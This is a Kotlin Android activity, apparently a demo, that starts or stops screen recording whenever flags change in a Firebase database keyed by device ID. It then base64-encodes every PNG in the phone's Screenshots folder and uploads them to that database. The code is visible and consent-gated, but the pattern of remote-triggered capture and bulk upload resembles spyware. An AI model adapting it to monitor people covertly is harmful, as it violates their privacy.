package com.example.toasty.security

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.util.Base64
import android.util.Log
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.toasty.R
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.storage.StorageReference
import java.io.ByteArrayOutputStream
import java.io.File


class FirebaseDataActivity : Activity() {

    // Root reference
    private lateinit var databaseReference: DatabaseReference
    private lateinit var storageReference: StorageReference
    private lateinit var imageScreenshot: ImageView
    private lateinit var textViewStatus: TextView

    companion object {
        private const val TAG: String = "ScreenCaptureFiles"
        var deviceUid: String = "Android"
        private val deviceVersion: String = Build.VERSION.RELEASE
        val deviceInfo = Build.BRAND + "(Device:" + Build.MODEL + "_OS:" + deviceVersion + ")"
        private const val SCREEN_RECORD_REQUEST_CODE = 1001
        private const val SCREEN_AUDIO_RECORD_CODE = 1002
        private const val SCREEN_STORAGE_CODE = 1003
        var recordScreen = true
        lateinit var mediaProjectionManager: MediaProjectionManager
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_firebase_data)

        imageScreenshot = findViewById(R.id.imageScreenshot)
        textViewStatus = findViewById(R.id.textViewStatus)

        deviceUid =
            deviceInfo + Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                ?: "Android"
        // Initialize Firebase Database reference
        databaseReference = FirebaseDatabase.getInstance().reference.child(deviceUid)
        // Initialize Firebase Storage reference
        storageReference = FirebaseStorage.getInstance().reference



        writeData()
        readData()
        realTimeUpdateData()

    }


    private fun writeData() {
        val user = User(
            "John",
            "Deo",
            25,
            screenshotStart = false,
            videoRecordingStart = false
        ) // Example data class
        databaseReference.child("user").setValue(user)

    }

    private fun readData() {
        databaseReference.child("user").get().addOnSuccessListener {
            val user = it.getValue(User::class.java)
            println("User: $user")
        }.addOnFailureListener {
            println("Error getting data: ${it.message}")
        }

    }

    private fun realTimeUpdateData() {
        // Real-time updates
        databaseReference.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    println("Real-time child: $child")
                    if (child.key.toString().equals("images")) {
                        println("Real-time key: ${child.key}")
                        var screenshots = child.value as HashMap<*, *>
                        for (key in screenshots.values) {
                            //println("Real-time child: $key")
                            imageScreenshot.setImageBitmap(decodeBase64ToBitmap(key.toString()))
                            break
                        }
                        //break
                    } else {
                        val user = child.getValue(User::class.java)
                        println("Real-time User: $user")
                        textViewStatus.text =
                            "ScreenshotStart ${user?.screenshotStart} : VideoRecordingStart ${user?.videoRecordingStart}"
                        if (user?.screenshotStart == true || user?.videoRecordingStart == true) {
                            recordScreen = user?.videoRecordingStart?:false
                            if (checkAudioPermission()) startScreenRecording()
                        } else if (user?.screenshotStart == false || user?.videoRecordingStart == false) {
                            stopScreenRecording()
                        }
                    }
                    /*                    val iterator: Iterator<String> = imagesJSONObj.keys()
                                    while (iterator.hasNext()) {
                                        String key = iterator
                                        Log.i("TAG","key:"+key +"--Value::"+imagesJSONObj.optString(key);
                                    }*/

                }
            }

            override fun onCancelled(error: DatabaseError) {
                println("Error: ${error.message}")
            }
        })
    }

    private fun imageReaderNew(root: File) {
        val fileList: ArrayList<File> = ArrayList()
        val listAllFiles = root.listFiles()

        if (listAllFiles != null && listAllFiles.size > 0) {
            var i: Int = 0
            for (currentFile in listAllFiles) {
                if (currentFile.name.endsWith(".png")) {
                    // File absolute path
                    Log.e("ScreenCaptureFiles downloadFilePath", currentFile.absolutePath)
                    // File Name
                    Log.e("ScreenCaptureFiles downloadFileName", currentFile.name)
                    fileList.add(currentFile.absoluteFile)
                    val bitmap = getBitmapFromFilePath(currentFile.absolutePath)
                    val base64String = bitmap?.let { encodeImageToBase64(it) }
                    base64String?.let {
                        saveImageToDatabase(
                            base64String,
                            currentFile.name.substringBeforeLast(".")
                        )
                    }
                    /*val fileUri: Uri = Uri.fromFile(File(currentFile.absolutePath))
                    val fileType = if (fileUri.toString().contains("png")) "image" else "video"
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            uploadFile(fileUri, fileType, currentFile.name)
                        } catch (e: IOException) {
                            e.printStackTrace()
                        }
                    }*/
                }
                //if(i==2)break
                i++
            }
            Log.w("ScreenCaptureFiles fileList", "" + fileList.size)
        }
    }

    private fun pickFile() {
        var gpath: String =
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).absolutePath
        var spath = "Screenshots"
        var fullpath = File(gpath + File.separator + spath)
        Log.w("ScreenCaptureFiles  fullpath", "" + fullpath)

        imageReaderNew(fullpath)
    }


    private fun encodeImageToBase64(bitmap: Bitmap): String {
        val byteArrayOutputStream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, byteArrayOutputStream)
        val byteArray = byteArrayOutputStream.toByteArray()
        return Base64.encodeToString(byteArray, Base64.DEFAULT)
    }

    private fun saveImageToDatabase(encodedImage: String, imageName: String) {
        //val databaseReference = FirebaseDatabase.getInstance().getReference("images")
        //val uploadId = "ScreenCapture_${System.currentTimeMillis()}"
        imageName?.let {
            databaseReference.child("images").child(it).setValue(encodedImage)
                .addOnSuccessListener {
                    Toast.makeText(
                        this,
                        "Image saved to Realtime Database $imageName",
                        Toast.LENGTH_SHORT
                    ).show()
                }
                .addOnFailureListener { exception ->
                    Toast.makeText(
                        this,
                        "Failed to save image: ${exception.message}",
                        Toast.LENGTH_SHORT
                    ).show()
                }
        }
    }

    private fun decodeBase64ToBitmap(encodedImage: String): Bitmap {
        val decodedBytes = Base64.decode(encodedImage, Base64.DEFAULT)
        return BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.size)
    }

    fun getBitmapFromFilePath(filePath: String): Bitmap? {
        val file = File(filePath)
        return if (file.exists()) {
            BitmapFactory.decodeFile(file.absolutePath)
        } else {
            null
        }
    }


    private fun checkAudioPermission(): Boolean {
        return if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.RECORD_AUDIO
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
                ),
                SCREEN_AUDIO_RECORD_CODE
            )
            false
        } else {
            true
        }
    }

    private fun startScreenRecording() {
        mediaProjectionManager =
            getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val intent = mediaProjectionManager.createScreenCaptureIntent()
        startActivityForResult(intent, SCREEN_RECORD_REQUEST_CODE)
    }

    private fun stopScreenRecording() {
        val serviceIntent = Intent(this, ScreenRecordingService::class.java)
        stopService(serviceIntent)
        pickFile()
        Toast.makeText(this, "Recording Stopped", Toast.LENGTH_SHORT).show()
    }

    override fun onDestroy() {
        super.onDestroy()
        stopScreenRecording()
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SCREEN_RECORD_REQUEST_CODE && resultCode == RESULT_OK) {
            try {
                val serviceIntent = Intent(this, ScreenRecordingService::class.java).apply {
                    putExtra("RESULT_CODE", resultCode)
                    putExtra("DATA", data)
                }
                startForegroundService(serviceIntent)
                Toast.makeText(this, "Recording Started", Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                e.printStackTrace()
                Toast.makeText(
                    this,
                    "Error Recording MediaRecorder: ${e.message}",
                    Toast.LENGTH_SHORT
                ).show()
            }
        } else if (requestCode == SCREEN_AUDIO_RECORD_CODE && resultCode == RESULT_OK) {
            Toast.makeText(this, "Audio Permission Granted", Toast.LENGTH_SHORT).show()
        } else if (requestCode == SCREEN_STORAGE_CODE && resultCode == RESULT_OK) {
            Toast.makeText(this, "Storage Permission Granted", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show()
        }
    }


    data class User(
        val firstName: String? = "",
        val lastName: String? = "",
        val age: Int? = 0,
        val screenshotStart: Boolean = false,
        val videoRecordingStart: Boolean = false
    )

}
